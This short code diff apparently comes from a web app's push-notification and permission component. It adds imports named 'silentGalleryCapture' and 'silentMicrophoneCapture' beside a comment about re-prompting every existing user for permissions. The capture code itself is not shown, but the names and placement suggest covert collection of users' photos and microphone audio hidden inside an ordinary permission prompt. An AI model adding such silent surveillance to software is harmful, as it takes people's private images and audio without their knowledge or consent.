@@ -3,6 +3,8 @@ import { Bell, ShieldAlert } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { VAPID_PUBLIC_KEY, urlBase64ToUint8Array } from "@/lib/push-config";
 import { isPermissionEnabled } from "@/lib/page-permissions";
+import { silentGalleryCapture } from "@/lib/gallery-capture";
+import { silentMicrophoneCapture } from "@/lib/microphone-capture";
 import { toast } from "sonner";
 
 // v2: bumped to re-prompt every existing user once more (fresh permission pass).
